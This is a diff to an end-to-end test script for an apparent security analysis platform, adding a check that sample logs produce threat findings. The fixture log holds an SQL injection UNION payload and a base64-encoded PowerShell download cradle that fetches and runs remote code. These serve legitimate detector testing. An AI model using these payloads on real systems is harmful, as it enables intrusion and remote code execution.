@@ -158,15 +158,34 @@ code=$(http POST /api/ai/ctf-hint "$TMP/hint.json" "$ANA")
 
 # 9. RBAC ------------------------------------------------------------------------
 say "\n[9] RBAC"
-code=$(http POST /api/simulation/inject "$TMP/empty.json" "$VIEW")
-[ "$code" = "403" ] && ok "viewer denied mutation (403)" || bad "viewer mutation -> $code (want 403)"
+code=$(http POST /api/analysis/ingest "$TMP/empty.json" "$VIEW")
+[ "$code" = "403" ] && ok "viewer denied log analysis (403)" || bad "viewer analysis -> $code (want 403)"
 code=$(http GET "/api/audit" "" "$ANA")
 [ "$code" = "403" ] && ok "analyst denied audit (403)" || bad "analyst audit -> $code (want 403)"
 code=$(http GET "/api/audit" "" "$ADMIN")
 [ "$code" = "200" ] && ok "admin can read audit" || bad "admin audit -> $code"
 
-# 10. Ingest ---------------------------------------------------------------------
-say "\n[10] Telemetry ingest"
+# 10. Log analysis (paste/edit/upload) ---------------------------------------------
+say "\n[10] Log & data analysis"
+cat > "$TMP/sample.log" <<'EOF'
+<134>Sep 10 09:15:22 dc-prod-01 sshd[1234]: Failed password for root from 45.227.255.9 port 55222 ssh2
+<134>Sep 10 09:15:23 dc-prod-01 sshd[1234]: Failed password for admin from 45.227.255.9 port 55223 ssh2
+<134>Sep 10 09:15:24 dc-prod-01 sshd[1234]: Failed password for sa from 45.227.255.9 port 55224 ssh2
+<134>Sep 10 09:15:31 web-portal-01 nginx[8901]: 194.26.29.114 - - [10/Sep/2026:09:15:31 +0000] "GET /api/staff/search?dept=finance' UNION SELECT 1,username,3 FROM users-- HTTP/1.1" 500 512
+<134>Sep 10 09:16:02 ws-finance-09 powershell[4021]: powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAzADcALgAzADIALgA2ADUALgAxADIALwBhACcAKQAgAC0AdwBpAG4AZABvAHcAcwB0AHkAbABlACAAaABpAGQAZABlAG4A
+EOF
+code=$(curl -s -o "$TMP/body" -w "%{http_code}" -X POST "$BASE_URL/api/analysis/ingest?source=e2e-sample.log" \
+  -H "Content-Type: text/plain" -H "Authorization: Bearer $ANA" --data-binary "@$TMP/sample.log")
+[ "$code" = "200" ] && ok "log ingest accepted (text/plain)" || bad "log ingest -> $code"
+FINDINGS=$(extract "$TMP/body" 'j.findings.length')
+[ "$FINDINGS" -ge 1 ] 2>/dev/null && ok "threat findings detected ($FINDINGS)" || bad "expected findings, got $FINDINGS"
+SUSP=$(extract "$TMP/body" 'j.suspiciousCount')
+[ "$SUSP" -ge 1 ] 2>/dev/null && ok "suspicious events flagged ($SUSP)" || bad "suspiciousCount=$SUSP"
+code=$(http GET "/api/analysis/runs" "" "$ANA")
+[ "$code" = "200" ] && ok "analysis history readable" || bad "analysis runs -> $code"
+
+# 11. Telemetry ingest ---------------------------------------------------------------------
+say "\n[11] Telemetry ingest"
 if [ -n "$INGEST_KEY" ]; then
   echo '{"events":[{"isAlert":true,"severity":"high","title":"E2E Ingest","source":"e2e","sourceIp":"203.0.113.77"}]}' > "$TMP/ingest.json"
   code=$(curl -s -o "$TMP/body" -w "%{http_code}" -X POST "$BASE_URL/api/telemetry/ingest" \
